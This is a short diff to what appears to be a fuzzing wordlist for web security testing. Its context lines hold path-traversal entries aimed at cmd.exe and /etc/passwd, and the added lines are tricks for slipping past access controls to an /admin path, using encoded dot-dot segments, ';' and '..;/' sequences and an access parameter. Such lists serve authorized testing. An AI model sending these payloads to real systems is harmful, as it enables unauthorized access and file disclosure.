@@ -30761,4 +30761,14 @@ device
 claves.tmp
 ..\\..\\..\\..\\..\\Windows\\System32\\cmd.exe
 ../../../../../../../etc/passwd
-
+/admin
+blablabal/%2e%2e/admin
+blablabal/..;/admin
+blablabal/;/admin
+blablabal/admin/..;/
+admin?access=1  
+/blablabal/%2e%2e/admin
+/blablabal/..;/admin
+/blablabal/;/admin
+/blablabal/admin/..;/
+/admin?access=1  
